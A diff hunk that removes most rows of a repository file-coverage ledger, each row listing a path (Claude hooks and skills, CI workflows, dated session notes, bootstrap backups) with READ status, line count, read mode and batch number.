@@ -4,837 +4,841 @@
 # written READ; a batch-level claim of coverage was never accepted as evidence.
 # status: READ | UNVERIFIED (fingerprint did not reproduce) | NO-RETURN
 # mode:   full (opened whole) | structural (large generated/vendored - see README)
-# status	path	lines	mode	batch
-READ	.claude/CLAUDE.md	318	full	b01
-READ	.claude/hooks/README.md	514	full	b01
-READ	.claude/hooks/change_guard.py	416	full	b01
-READ	.claude/hooks/doc-routes.json	369	full	b01
-READ	.claude/hooks/git_state_guard.py	229	full	b01
-READ	.claude/hooks/owner_review.py	480	full	b01
-READ	.claude/hooks/read_before_write.py	316	full	b01
-READ	.claude/hooks/route_docs.py	219	full	b01
-READ	.claude/hooks/trigger_tools_guard.py	344	full	b01
-READ	.claude/settings.json	104	full	b01
-READ	.claude/skills/analysis/SKILL.md	14	full	b01
-READ	.claude/skills/asset-pipeline/SKILL.md	106	full	b01
-READ	.claude/skills/audio-prompt/SKILL.md	105	full	b01
-READ	.claude/skills/capability-probe/SKILL.md	98	full	b01
-READ	.claude/skills/chase-references/SKILL.md	62	full	b01
-READ	.claude/skills/continuation-prompt/SKILL.md	229	full	b01
-READ	.claude/skills/cover-art-prompt/SKILL.md	98	full	b02
-READ	.claude/skills/decision-capture/SKILL.md	96	full	b02
-READ	.claude/skills/deep-research/SKILL.md	16	full	b02
-READ	.claude/skills/delegate-read/SKILL.md	100	full	b02
-READ	.claude/skills/image-prompt/SKILL.md	144	full	b02
-READ	.claude/skills/implementation-prompt/SKILL.md	150	full	b02
-READ	.claude/skills/intake/SKILL.md	167	full	b02
-READ	.claude/skills/owner-brief/SKILL.md	74	full	b02
-READ	.claude/skills/parallax-prompt/SKILL.md	102	full	b02
-READ	.claude/skills/prep-owner-steps/SKILL.md	81	full	b02
-READ	.claude/skills/prompt-preflight/SKILL.md	126	full	b02
-READ	.claude/skills/quality-gate/SKILL.md	15	full	b02
-READ	.claude/skills/question/SKILL.md	14	full	b02
-READ	.claude/skills/rationalize/SKILL.md	58	full	b02
-READ	.claude/skills/release/SKILL.md	87	full	b02
-READ	.claude/skills/repo-health/SKILL.md	15	full	b02
-READ	.claude/skills/review/SKILL.md	16	full	b02
-READ	.claude/skills/scope-backlog-item/SKILL.md	86	full	b02
-READ	.claude/skills/session-close/SKILL.md	173	full	b02
-READ	.claude/skills/sprite-prompt/SKILL.md	103	full	b02
-READ	.claude/skills/upgrade-distribution/SKILL.md	67	full	b02
-READ	.gitattributes	3	full	b02
-READ	.github/workflows/merge-on-green.yml	270	full	b02
-READ	.github/workflows/roster-freshness.yml	62	full	b02
-READ	.github/workflows/roster-regen.yml	204	full	b02
-READ	.github/workflows/substrate-gate.yml	316	full	b02
-READ	.gitignore	12	full	b03
-READ	.ignore	3	full	b03
-READ	.session-journal.md	27	full	b03
-READ	.sessions/2026-07-09-ci-tier-standard.md	79	full	b03
-READ	.sessions/2026-07-09-game-lab-founding.md	90	full	b03
-READ	.sessions/2026-07-09-gen1-winddown-prompt.md	60	full	b03
-READ	.sessions/2026-07-09-housekeeping-verification.md	60	full	b03
-READ	.sessions/2026-07-09-ideas-r21-handoff.md	72	full	b03
-READ	.sessions/2026-07-09-merge-authority-env-archetypes.md	76	full	b03
-READ	.sessions/2026-07-09-ping-ack-gen2-finalization.md	73	full	b03
-READ	.sessions/2026-07-09-seed-home-repo.md	37	full	b03
-READ	.sessions/2026-07-09-succession-package.md	70	full	b03
-READ	.sessions/2026-07-10-archive-prep.md	92	full	b03
-READ	.sessions/2026-07-10-chain-order-009-010.md	95	full	b03
-READ	.sessions/2026-07-10-chain-slice-4.md	100	full	b03
-READ	.sessions/2026-07-10-chain-slice-5-sbgames16-verify.md	79	full	b03
-READ	.sessions/2026-07-10-chain-slice-6-sbgames5-verify.md	61	full	b03
-READ	.sessions/2026-07-10-coordinator-boot.md	71	full	b03
-READ	.sessions/2026-07-10-custom-instructions-full-paste.md	54	full	b03
-READ	.sessions/2026-07-10-fable5-review-landing.md	81	full	b03
-READ	.sessions/2026-07-10-kit-upgrade-v1.7.1.md	109	full	b03
-READ	.sessions/2026-07-10-kit-upgrade-v170.md	69	full	b03
-READ	.sessions/2026-07-10-launch-readiness-heartbeat.md	77	full	b03
-READ	.sessions/2026-07-10-launch-readiness.md	89	full	b03
-READ	.sessions/2026-07-10-model-attribution-finding.md	66	full	b03
-READ	.sessions/2026-07-10-morning-consolidation.md	91	full	b03
-READ	.sessions/2026-07-10-night-review-landing.md	81	full	b04
-READ	.sessions/2026-07-10-night-review-remediation.md	98	full	b04
-READ	.sessions/2026-07-10-order-003-007-review-queue.md	66	full	b04
-READ	.sessions/2026-07-10-order-004-economics-ledger.md	73	full	b04
-READ	.sessions/2026-07-10-order-012-games-mapping.md	72	full	b04
-READ	.sessions/2026-07-10-order-013-games-conformed.md	78	full	b04
-READ	.sessions/2026-07-10-package-registry.md	97	full	b04
-READ	.sessions/2026-07-10-permissions-doctrine.md	92	full	b04
-READ	.sessions/2026-07-10-q0265-doctrine-fold.md	54	full	b04
-READ	.sessions/2026-07-10-registry-gap-closure.md	74	full	b04
-READ	.sessions/2026-07-10-round3-standing-debts.md	113	full	b04
-READ	.sessions/2026-07-10-routine-wall-correction.md	86	full	b04
-READ	.sessions/2026-07-10-ultracode-verification.md	81	full	b04
-READ	.sessions/2026-07-10-universal-permissions-block.md	22	full	b04
-READ	.sessions/2026-07-10-universal-pointer-prompts.md	48	full	b04
-READ	.sessions/2026-07-10-wake-1631-order-002.md	79	full	b04
-READ	.sessions/2026-07-10-wake-1831-doctrine.md	107	full	b04
-READ	.sessions/2026-07-10-wake-drain-roster.md	98	full	b04
-READ	.sessions/2026-07-10-wake-heartbeat.md	72	full	b04
-READ	.sessions/2026-07-11-archive-prep-closeout.md	110	full	b04
-READ	.sessions/2026-07-11-chain-slice-7-roster3-trading21.md	81	full	b04
-READ	.sessions/2026-07-11-coordinator-archive-closeout.md	87	full	b04
-READ	.sessions/2026-07-11-f1-cutover-record.md	69	full	b04
-READ	.sessions/2026-07-11-file-017-018-catchup.md	65	full	b04
-READ	.sessions/2026-07-11-forge-relay-chain-idle.md	84	full	b04
-READ	.sessions/2026-07-11-gen-roster-mechanization.md	79	full	b04
-READ	.sessions/2026-07-11-heartbeat-2350.md	32	full	b05
-READ	.sessions/2026-07-11-instruction-env-audit.md	69	full	b05
-READ	.sessions/2026-07-11-kit-upgrade-v1.10.0.md	68	full	b05
-READ	.sessions/2026-07-11-kit-upgrade-v1.10.1.md	67	full	b05
-READ	.sessions/2026-07-11-kit-upgrade-v1.11.0.md	80	full	b05
-READ	.sessions/2026-07-11-kit-upgrade-v1.8.0.md	120	full	b05
-READ	.sessions/2026-07-11-kit-upgrade-v1.9.0.md	79	full	b05
-READ	.sessions/2026-07-11-kit-v1-12-0-upgrade.md	103	full	b05
-READ	.sessions/2026-07-11-kit-v1121-upgrade.md	86	full	b05
-READ	.sessions/2026-07-11-mineverse-retro-registry.md	84	full	b05
-READ	.sessions/2026-07-11-order-010-relay-owner-queue.md	68	full	b05
-READ	.sessions/2026-07-11-order-015-registry-centralization.md	71	full	b05
-READ	.sessions/2026-07-11-order-016-audit-actions.md	86	full	b05
-READ	.sessions/2026-07-11-order-017-instruction-reissue.md	69	full	b05
-READ	.sessions/2026-07-11-order-018-env-consolidation.md	102	full	b05
-READ	.sessions/2026-07-11-owner-codex-fleetwide.md	92	full	b05
-READ	.sessions/2026-07-11-owner-queue-verified-refresh.md	66	full	b05
-READ	.sessions/2026-07-11-p1-freshness-custodian.md	145	full	b05
-READ	.sessions/2026-07-11-p2-queue-generation.md	158	full	b05
-READ	.sessions/2026-07-11-p3-coverage-index.md	103	full	b05
-READ	.sessions/2026-07-11-permission-rules-port.md	68	full	b05
-READ	.sessions/2026-07-11-relay-completion.md	24	full	b05
-READ	.sessions/2026-07-11-restructure-prompts-slice2.md	114	full	b05
-READ	.sessions/2026-07-11-restructure-roster-slice3.md	100	full	b05
-READ	.sessions/2026-07-11-restructure-seats.md	115	full	b05
-READ	.sessions/2026-07-11-review-queue-verify-8-12.md	51	full	b05
-READ	.sessions/2026-07-11-roster-gen-4.md	73	full	b06
-READ	.sessions/2026-07-11-roster-gen-5-sweep.md	93	full	b06
-READ	.sessions/2026-07-11-roster-gen-6.md	91	full	b06
-READ	.sessions/2026-07-11-universal-v4-merge-clause.md	60	full	b06
-READ	.sessions/2026-07-12-consolidation-plan-v34.md	69	full	b06
-READ	.sessions/2026-07-12-consolidation-reset-plan.md	60	full	b06
-READ	.sessions/2026-07-12-coordinator-closeout.md	40	full	b06
-READ	.sessions/2026-07-12-external-research-prompt.md	22	full	b06
-READ	.sessions/2026-07-12-heartbeat-v33.md	31	full	b06
-READ	.sessions/2026-07-12-kit-upgrade-v1.15.0.md	28	full	b06
-READ	.sessions/2026-07-12-kit-upgrade-v1130.md	24	full	b06
-READ	.sessions/2026-07-12-kit-upgrade-v1140.md	61	full	b06
-READ	.sessions/2026-07-12-merge-on-green.md	67	full	b06
-READ	.sessions/2026-07-12-oq-restamp-v31.md	57	full	b06
-READ	.sessions/2026-07-12-order-014-v31-crosscheck.md	58	full	b06
-READ	.sessions/2026-07-12-order-020-trigger-health.md	82	full	b06
-READ	.sessions/2026-07-12-order020-tick-pileup.md	75	full	b06
-READ	.sessions/2026-07-12-prompts-v3-1-qa-fixes.md	77	full	b06
-READ	.sessions/2026-07-12-prompts-v3-2-stateless.md	81	full	b06
-READ	.sessions/2026-07-12-prompts-v3-draft.md	64	full	b06
-READ	.sessions/2026-07-12-prompts-v33.md	67	full	b06
-READ	.sessions/2026-07-12-qa-boot-sim.md	54	full	b06
-READ	.sessions/2026-07-12-qa-incident-replay.md	23	full	b06
-READ	.sessions/2026-07-12-qa-question-rounds.md	43	full	b06
-READ	.sessions/2026-07-12-registry-sync-v32.md	80	full	b06
-READ	.sessions/2026-07-12-repo-consolidation-census.md	22	full	b06
-READ	.sessions/2026-07-12-research-census-core.md	45	full	b07
-READ	.sessions/2026-07-12-research-census-sat.md	56	full	b07
-READ	.sessions/2026-07-12-research-platform.md	40	full	b07
-READ	.sessions/2026-07-12-research-prompt-arch.md	41	full	b07
-READ	.sessions/2026-07-12-research-prompt-currency.md	47	full	b07
-READ	.sessions/2026-07-12-roster-pokemon-transport.md	88	full	b07
-READ	.sessions/2026-07-12-seat-digest-regen-wiring.md	128	full	b07
-READ	.sessions/2026-07-12-staleness-sweep-8seat.md	56	full	b07
-READ	.sessions/2026-07-12-sweep-midday.md	23	full	b07
-READ	.sessions/2026-07-12-trigger-health-remediation.md	78	full	b07
-READ	.sessions/2026-07-13-central-docs-review.md	45	full	b07
-READ	.sessions/2026-07-13-consolidation-batch.md	102	full	b07
-READ	.sessions/2026-07-13-coordinator-close.md	151	full	b07
-READ	.sessions/2026-07-13-eap-final-worklists.md	35	full	b07
-READ	.sessions/2026-07-13-fleet-rollup.md	65	full	b07
-READ	.sessions/2026-07-13-morning-tally.md	83	full	b07
-READ	.sessions/2026-07-13-night-final-order.md	67	full	b07
-READ	.sessions/2026-07-13-night-watchdog-1.md	127	full	b07
-READ	.sessions/2026-07-13-night-watchdog-2.md	163	full	b07
-READ	.sessions/2026-07-13-night-watchdog-3.md	112	full	b07
-READ	.sessions/2026-07-13-r27-detection-amendment.md	54	full	b07
-READ	.sessions/2026-07-13-route-batch2.md	89	full	b07
-READ	.sessions/2026-07-13-route-idle-questions.md	93	full	b07
-READ	.sessions/2026-07-13-trigger-health-i1.md	59	full	b07
-READ	.sessions/2026-07-13-v3-rider-fold.md	70	full	b07
-READ	.sessions/2026-07-13-v35-stage2.md	65	full	b07
-READ	.sessions/2026-07-13-wake-1434z.md	16	full	b08
-READ	.sessions/2026-07-13-wake-1633z.md	18	full	b08
-READ	.sessions/2026-07-13-wake-1834z.md	23	full	b08
-READ	.sessions/2026-07-13-wake-2033z.md	53	full	b08
-READ	.sessions/2026-07-13-wake.md	70	full	b08
-READ	.sessions/2026-07-14-branch-recreation-followup.md	15	full	b08
-READ	.sessions/2026-07-14-branch-sweep-addendum.md	16	full	b08
-READ	.sessions/2026-07-14-checklist-refresh-2.md	11	full	b08
-READ	.sessions/2026-07-14-eap-final-closeout.md	72	full	b08
-READ	.sessions/2026-07-14-eap-final-ender.md	57	full	b08
-READ	.sessions/2026-07-14-eap-project-audit.md	53	full	b08
-READ	.sessions/2026-07-14-eap-synthesis.md	18	full	b08
-READ	.sessions/2026-07-14-email-rebalance.md	16	full	b08
-READ	.sessions/2026-07-14-fm-dispatch-0530z-close.md	87	full	b08
-READ	.sessions/2026-07-14-fm-dispatch-0740z.md	71	full	b08
-READ	.sessions/2026-07-14-fm-dispatch-ledger.md	67	full	b08
-READ	.sessions/2026-07-14-kit-upgrade-v1.16.0.md	22	full	b08
-READ	.sessions/2026-07-14-ledger-trueup-13.md	33	full	b08
-READ	.sessions/2026-07-14-post-sweep-reconcile.md	13	full	b08
-READ	.sessions/2026-07-14-wake-0235z.md	131	full	b08
-READ	.sessions/2026-07-14-wake-0434z.md	107	full	b08
-READ	.sessions/2026-07-14-wake-0633z.md	71	full	b08
-READ	.sessions/2026-07-14-wake-0845z.md	114	full	b08
-READ	.sessions/2026-07-14-wake-2034z.md	63	full	b08
-READ	.sessions/2026-07-14-walkthrough-sweep.md	22	full	b08
-READ	.sessions/2026-07-15-card-modelline-groom.md	40	full	b08
-READ	.sessions/2026-07-15-cr-disposition-sweep.md	56	full	b09
-READ	.sessions/2026-07-15-fleet-oversight-evening.md	79	full	b09
-READ	.sessions/2026-07-15-lanes-regen-fix.md	68	full	b09
-READ	.sessions/2026-07-15-merge-on-green-verify-0715.md	107	full	b09
-READ	.sessions/2026-07-15-oversight-wake-0715.md	76	full	b09
-READ	.sessions/2026-07-15-oversight-wake-0715b.md	101	full	b09
-READ	.sessions/2026-07-15-oversight-wake-1659.md	84	full	b09
-READ	.sessions/2026-07-15-owner-no-review-order.md	60	full	b09
-READ	.sessions/2026-07-15-owner-queue-kit-go.md	46	full	b09
-READ	.sessions/2026-07-15-pre-reboot-review.md	25	full	b09
-READ	.sessions/2026-07-15-prompts-v37-duty-form.md	83	full	b09
-READ	.sessions/2026-07-15-queue-a63-next-triage.md	65	full	b09
-READ	.sessions/2026-07-15-registry-v3-5-synthesis.md	87	full	b09
-READ	.sessions/2026-07-15-retire-c61.md	18	full	b09
-READ	.sessions/2026-07-15-roster-regen-0810.md	60	full	b09
-READ	.sessions/2026-07-15-session-ender-handoff.md	71	full	b09
-READ	.sessions/2026-07-15-triggers-snapshot-refresh-2.md	48	full	b09
-READ	.sessions/2026-07-15-wake-1126z-queue-sweep.md	87	full	b09
-READ	.sessions/2026-07-16-fm-wake-jul16.md	78	full	b09
-READ	.sessions/2026-07-16-morning-wake-triage.md	74	full	b09
-READ	.sessions/2026-07-16-night-audit-records.md	23	full	b09
-READ	.sessions/2026-07-16-overnight-plan-menu-0716.md	15	full	b09
-READ	.sessions/2026-07-16-pr-audit-0716.md	54	full	b09
-READ	.sessions/2026-07-16-queue-audit-items-0716.md	27	full	b09
-READ	.sessions/2026-07-16-r26-trigger-tooling.md	71	full	b09
-READ	.sessions/2026-07-16-recreation-runbook-0716.md	11	full	b09
-READ	.sessions/2026-07-16-sweep-stale-claim.md	18	full	b10
-READ	.sessions/2026-07-16-trigger-snapshot-pm.md	66	full	b10
-READ	.sessions/2026-07-16-wake-0716-pm-fix227prov.md	22	full	b10
-READ	.sessions/2026-07-16-wake-0716-pm-sweep.md	31	full	b10
-READ	.sessions/2026-07-17-coordinator-ender.md	23	full	b10
-READ	.sessions/2026-07-17-fm-anthropic-email-pack.md	21	full	b10
-READ	.sessions/2026-07-17-fm-recreation-ruling.md	22	full	b10
-READ	.sessions/2026-07-17-fm-s5-docs-link-drift.md	24	full	b10
-READ	.sessions/2026-07-17-fm-s9-capabilities-wall-age.md	24	full	b10
-READ	.sessions/2026-07-17-fm-wake-chain-record-fix.md	21	full	b10
-READ	.sessions/2026-07-17-fm-winddown-housekeeping.md	23	full	b10
-READ	.sessions/2026-07-17-fresh-start-cleanup.md	67	full	b10
-READ	.sessions/2026-07-17-midday-snapshot-0717.md	37	full	b10
-READ	.sessions/2026-07-17-night-snapshot-0717.md	37	full	b10
-READ	.sessions/2026-07-17-overnight-incidents-0717.md	19	full	b10
-READ	.sessions/2026-07-17-owner-actions-0717.md	17	full	b10
-READ	.sessions/2026-07-17-queue-closeout-0717.md	17	full	b10
-READ	.sessions/2026-07-18-fm-apparatus-sizing.md	22	full	b10
-READ	.sessions/2026-07-18-fm-boot-file.md	38	full	b10
-READ	.sessions/2026-07-18-fm-capability-heartbeat.md	91	full	b10
-READ	.sessions/2026-07-18-fm-current-state-refresh.md	23	full	b10
-READ	.sessions/2026-07-18-fm-date-capability-walls.md	62	full	b10
-READ	.sessions/2026-07-18-fm-doctrine-docs-sync.md	63	full	b10
-READ	.sessions/2026-07-18-fm-fleet-doctrine-sweep-record.md	21	full	b10
-READ	.sessions/2026-07-18-fm-meta-restamp-v37.md	91	full	b10
-READ	.sessions/2026-07-18-fm-no-false-walls-guard.md	124	full	b10
-READ	.sessions/2026-07-18-fm-overnight-oversight.md	27	full	b11
-READ	.sessions/2026-07-18-fm-owner-steps-revise.md	68	full	b11
-READ	.sessions/2026-07-18-fm-owner-steps.md	22	full	b11
-READ	.sessions/2026-07-18-fm-remove-winddown-current-state.md	76	full	b11
-READ	.sessions/2026-07-18-fm-roster-lapse-note.md	21	full	b11
-READ	.sessions/2026-07-18-fm-routine-claims-fence.md	122	full	b11
-READ	.sessions/2026-07-18-fm-s3-triage-staleness.md	25	full	b11
-READ	.sessions/2026-07-18-fm-sweep-records.md	65	full	b11
-READ	.sessions/2026-07-18-fm-verify-routine-state.md	90	full	b11
-READ	.sessions/2026-07-18-fm-wake-oversight.md	57	full	b11
-READ	.sessions/2026-07-18-fm-websites-custody-snapshot.md	21	full	b11
-READ	.sessions/2026-07-18-hub-sweep-record.md	74	full	b11
-READ	.sessions/2026-07-18-prompt-version-v3.8.md	27	full	b11
-READ	.sessions/2026-07-18-seat-digest-regen.md	72	full	b11
-READ	.sessions/2026-07-18-session-close-ender.md	63	full	b11
-READ	.sessions/2026-07-18-startup-prompt-identity-block.md	26	full	b11
-READ	.sessions/2026-07-18-universal-continue-prompt.md	27	full	b11
-READ	.sessions/2026-07-18-verified-capabilities.md	36	full	b11
-READ	.sessions/2026-07-19-fm-03z-records.md	102	full	b11
-READ	.sessions/2026-07-19-fm-06z-morning.md	85	full	b11
-READ	.sessions/2026-07-19-fm-06z-snapshot.md	81	full	b11
-READ	.sessions/2026-07-19-fm-10z-snapshot.md	161	full	b11
-READ	.sessions/2026-07-19-fm-14z-cycle.md	85	full	b11
-READ	.sessions/2026-07-19-fm-18z-cycle.md	97	full	b11
-READ	.sessions/2026-07-19-fm-22z-cycle.md	158	full	b11
-READ	.sessions/2026-07-19-fm-adopt-r30.md	81	full	b11
-READ	.sessions/2026-07-19-fm-capabilities-linter.md	125	full	b12
-READ	.sessions/2026-07-19-fm-evening-groom.md	105	full	b12
-READ	.sessions/2026-07-19-fm-fence-emitter.md	114	full	b12
-READ	.sessions/2026-07-19-fm-i8-provenance.md	105	full	b12
-READ	.sessions/2026-07-19-fm-label-hygiene.md	135	full	b12
-READ	.sessions/2026-07-19-fm-lane-liveness.md	109	full	b12
-READ	.sessions/2026-07-19-fm-morning-records.md	79	full	b12
-READ	.sessions/2026-07-19-fm-planning-groom.md	72	full	b12
-READ	.sessions/2026-07-19-fm-r30-check.md	97	full	b12
-READ	.sessions/2026-07-19-fm-regen-skip-detector.md	102	full	b12
-READ	.sessions/2026-07-19-fm-roster-cron-resilience.md	69	full	b12
-READ	.sessions/2026-07-19-fm-snapshot-00z.md	146	full	b12
-READ	.sessions/2026-07-19-fm-volatile-drift.md	117	full	b12
-READ	.sessions/2026-07-19-fm-wake-idle-detector.md	133	full	b12
-READ	.sessions/2026-07-20-fm-01z-cycle.md	166	full	b12
-READ	.sessions/2026-07-20-fm-05z-cycle.md	186	full	b12
-READ	.sessions/2026-07-20-fm-1130z-cycle.md	84	full	b12
-READ	.sessions/2026-07-20-fm-1530z-cycle.md	92	full	b12
-READ	.sessions/2026-07-20-fm-declared-idle.md	127	full	b12
-READ	.sessions/2026-07-20-fm-liveness-ledger.md	189	full	b12
-READ	.sessions/2026-07-20-fm-morning-records.md	98	full	b12
-READ	.sessions/2026-07-21-fm-0042z-cycle.md	101	full	b12
-READ	.sessions/2026-07-21-fm-0818z-cycle.md	94	full	b12
-READ	.sessions/2026-07-21-fm-16z-cycle.md	93	full	b12
-READ	.sessions/2026-07-21-fm-final-closer.md	56	full	b12
-READ	.sessions/2026-07-21-fm-seat-close.md	55	full	b12
-READ	.sessions/2026-07-23-hub-forge-slice4-handoff.md	81	full	b13
-READ	.sessions/2026-07-23-hub-forge-slice4-landed.md	42	full	b13
-READ	.sessions/2026-07-26-hub-ci-consolidation.md	76	full	b13
-READ	.sessions/2026-07-26-hub-consolidation-plan-v2.md	89	full	b13
-READ	.sessions/2026-07-26-hub-consolidation-program.md	68	full	b13
-READ	.sessions/2026-07-26-hub-e1-final-email-plan.md	49	full	b13
-READ	.sessions/2026-07-26-hub-fleet-consolidation-plan.md	75	full	b13
-READ	.sessions/2026-07-26-hub-full-corpus-readback.md	78	full	b13
-READ	.sessions/2026-07-26-hub-od10-12-mail-layer.md	57	full	b13
-READ	.sessions/2026-07-31-false-github-api-wall.md	145	full	b13
-READ	.sessions/2026-08-01-e1-owner-reserved.md	85	full	b13
-READ	.sessions/2026-08-03-hub-gemini-video-qa-gem.md	125	full	b13
-READ	.sessions/2026-08-03-hub-gh-is-not-a-wall.md	104	full	b13
-READ	.sessions/2026-08-03-hub-pat-is-environment-scoped.md	51	full	b13
-READ	.sessions/2026-08-03-hub-provider-references.md	94	full	b13
-READ	.sessions/2026-08-03-hub-surfaces-and-prompt-skills.md	116	full	b13
-READ	.sessions/2026-08-04-hub-art-finding-corrections.md	78	full	b13
-READ	.sessions/2026-08-04-hub-art-pipeline-archaeology.md	81	full	b13
-READ	.sessions/2026-08-04-hub-chroma-spill-measured.md	87	full	b13
-READ	.sessions/2026-08-04-hub-final-three-skills.md	74	full	b13
-READ	.sessions/2026-08-04-hub-image-generation-comparison.md	71	full	b13
-READ	.sessions/2026-08-04-hub-inhabiting-vs-observing.md	78	full	b13
-READ	.sessions/2026-08-04-hub-provider-capability-reference.md	99	full	b13
-READ	.sessions/2026-08-04-hub-provider-docs-accuracy-pass.md	115	full	b13
-READ	.sessions/2026-08-04-hub-provider-refs-deep-research-review.md	81	full	b13
-READ	.sessions/2026-08-04-hub-skill-family-and-audit.md	100	full	b13
-READ	.sessions/2026-08-04-hub-skill-router-and-pipeline.md	76	full	b14
-READ	.sessions/2026-08-04-hub-structure-converges-models.md	77	full	b14
-READ	.sessions/2026-08-05-aistudio-billing-caveat.md	57	full	b14
-READ	.sessions/2026-08-05-calibration-and-602.md	123	full	b14
-READ	.sessions/2026-08-05-control-veto-ratified.md	59	full	b14
-READ	.sessions/2026-08-05-delegation-and-surface-notes.md	101	full	b14
-READ	.sessions/2026-08-05-discord-test-server-and-bot-value.md	88	full	b14
-READ	.sessions/2026-08-05-doc-routing-hook.md	181	full	b14
-READ	.sessions/2026-08-05-foundation-continuation.md	96	full	b14
-READ	.sessions/2026-08-05-gemini-delegation.md	81	full	b14
-READ	.sessions/2026-08-05-gemini-paid-tier-live.md	64	full	b14
-READ	.sessions/2026-08-05-gemini-quotas-and-interactions.md	79	full	b14
-READ	.sessions/2026-08-05-gemini-retrieval-not-reading.md	76	full	b14
-READ	.sessions/2026-08-05-gemini-surface-probe.md	72	full	b14
-READ	.sessions/2026-08-05-handoff-fidelity-and-boot-path.md	120	full	b14
-READ	.sessions/2026-08-05-hud-telemetry-verification.md	74	full	b14
-READ	.sessions/2026-08-05-interactions-api-correction.md	134	full	b14
-READ	.sessions/2026-08-05-name-decided-queue-sync.md	53	full	b14
-READ	.sessions/2026-08-05-navigation-graph-correction.md	83	full	b14
-READ	.sessions/2026-08-05-owner-provisioning-claims.md	113	full	b14
-READ	.sessions/2026-08-05-play-closed-test-and-gemini-benchmark.md	100	full	b14
-READ	.sessions/2026-08-05-play-submission-requirements.md	89	full	b14
-READ	.sessions/2026-08-05-presence-model.md	80	full	b14
-READ	.sessions/2026-08-05-studio-api-asymmetry.md	65	full	b14
-READ	.sessions/2026-08-05-superbot-next-live-audit.md	88	full	b14
-READ	.sessions/2026-08-05-tester-admission-verified.md	74	full	b14
-READ	.sessions/2026-08-05-three-repo-state-audit.md	129	full	b15
-READ	.sessions/2026-08-05-vertex-first-directive.md	101	full	b15
-READ	.sessions/2026-08-05-vertex-live.md	68	full	b15
-READ	.sessions/2026-08-05-video-generation-pipeline.md	82	full	b15
-READ	.sessions/2026-08-05-walls-refuted.md	89	full	b15
-READ	.sessions/2026-08-06-broke-main-and-wired-the-gate.md	114	full	b15
-READ	.sessions/2026-08-06-codex-holed-my-gate.md	108	full	b15
-READ	.sessions/2026-08-06-codex-rung-evidence.md	86	full	b15
-READ	.sessions/2026-08-06-foundation-verification.md	73	full	b15
-READ	.sessions/2026-08-06-free-on-cost-global-in-scope.md	104	full	b15
-READ	.sessions/2026-08-06-growth-is-the-measurement.md	107	full	b15
-READ	.sessions/2026-08-06-restate-in-the-prompt.md	95	full	b15
-READ	.sessions/2026-08-06-review-ladder.md	99	full	b15
-READ	.sessions/2026-08-06-round-five-falsified-me.md	90	full	b15
-READ	.sessions/2026-08-06-screen-recording-sampling.md	109	full	b15
-READ	.sessions/2026-08-06-sweep-telemetry.md	53	full	b15
-READ	.sessions/2026-08-06-three-gemini-paths.md	112	full	b15
-READ	.sessions/2026-08-06-use-versus-mention.md	118	full	b15
-READ	.sessions/2026-08-07-boot-source-and-ledger-corrections.md	123	full	b15
-READ	.sessions/2026-08-07-codex-caught-four.md	92	full	b15
-READ	.sessions/2026-08-07-curious-research-handover.md	97	full	b15
-READ	.sessions/2026-08-07-retire-the-roster.md	103	full	b15
-READ	.sessions/2026-08-07-substrate-measured.md	60	full	b15
-READ	.sessions/2026-08-08-index-layer2-spider-swing.md	302	full	b15
-READ	.sessions/2026-08-08-layer2-ratification.md	295	full	b15
-READ	.sessions/2026-08-08-owner-intent-capture.md	135	full	b15
-READ	.sessions/2026-08-08-rules-enforcement-phase1.md	170	full	b16
-READ	.sessions/2026-08-09-error-to-mechanism.md	199	full	b16
-READ	.sessions/2026-08-09-false-wall-review-and-negation-scope.md	163	full	b16
-READ	.sessions/2026-08-09-intent-architecture-phase-2.md	332	full	b16
-READ	.sessions/2026-08-09-kit-upgrade-eap-reconciliation.md	472	full	b16
-READ	.sessions/2026-08-09-trigger-tools-guard.md	75	full	b16
-READ	.sessions/2026-08-10-d2-fleet-manager-truth-pass.md	153	full	b16
-READ	.sessions/2026-08-10-verify-fm835-and-chatgpt-surface.md	113	full	b16
-READ	.sessions/README.md	10	full	b16
-READ	.substrate/agents/architect.md	18	full	b16
-READ	.substrate/agents/researcher.md	14	full	b16
-READ	.substrate/agents/reviewer.md	17	full	b16
-READ	.substrate/backup/bootstrap-1.10.0.py	14678	structural	b17
-READ	.substrate/backup/bootstrap-1.10.1.py	14734	structural	b17
-READ	.substrate/backup/bootstrap-1.11.0.py	14962	structural	b17
-READ	.substrate/backup/bootstrap-1.12.0.py	15288	structural	b17
-READ	.substrate/backup/bootstrap-1.12.1.py	15579	structural	b18
-READ	.substrate/backup/bootstrap-1.13.0.py	16210	structural	b18
-READ	.substrate/backup/bootstrap-1.14.0.py	16983	structural	b18
-READ	.substrate/backup/bootstrap-1.15.0.py	17855	structural	b18
-READ	.substrate/backup/bootstrap-1.16.0.py	20954	structural	b19
-READ	.substrate/backup/bootstrap-1.17.0.py	21274	structural	b19
-READ	.substrate/backup/bootstrap-1.20.1.py	27948	structural	b19
-READ	.substrate/backup/bootstrap-1.4.0.py	10618	structural	b19
-READ	.substrate/backup/bootstrap-1.7.0.py	12012	structural	b20
-READ	.substrate/backup/bootstrap-1.7.1.py	12893	structural	b20
-READ	.substrate/backup/bootstrap-1.8.0.py	13942	structural	b20
-READ	.substrate/backup/bootstrap-1.9.0.py	14371	structural	b20
-READ	.substrate/backup/last-upgrade.json	7	full	b21
-READ	.substrate/backup/state.json	157	full	b21
-READ	.substrate/backup/substrate-gate.pre-regen-4f50eb4d.yml	169	full	b21
-READ	.substrate/backup/substrate-gate.pre-regen-936a5584.yml	202	full	b21
-READ	.substrate/check-exceptions.yml	75	full	b21
-READ	.substrate/ci/auto-merge-enabler.yml	98	full	b21
-READ	.substrate/ci/branch-sweep.yml	130	full	b21
-READ	.substrate/ci/quality.yml.example	32	full	b21
-READ	.substrate/ci/substrate-gate.yml	244	full	b21
-READ	.substrate/claude/CLAUDE.md	65	full	b21
-READ	.substrate/episodic_index.json	18	full	b21
-READ	.substrate/guard-fires.jsonl	9811	structural	b22
-READ	.substrate/hooks/README.md	19	full	b23
-READ	.substrate/hooks/settings.template.json	46	full	b23
-READ	.substrate/skills/analysis/SKILL.md	14	full	b23
-READ	.substrate/skills/chase-references/SKILL.md	62	full	b23
-READ	.substrate/skills/deep-research/SKILL.md	16	full	b23
-READ	.substrate/skills/intake/SKILL.md	70	full	b23
-READ	.substrate/skills/prep-owner-steps/SKILL.md	71	full	b23
-READ	.substrate/skills/quality-gate/SKILL.md	15	full	b23
-READ	.substrate/skills/question/SKILL.md	14	full	b23
-READ	.substrate/skills/rationalize/SKILL.md	58	full	b23
-READ	.substrate/skills/release/SKILL.md	77	full	b23
-READ	.substrate/skills/repo-health/SKILL.md	15	full	b23
-READ	.substrate/skills/review/SKILL.md	16	full	b23
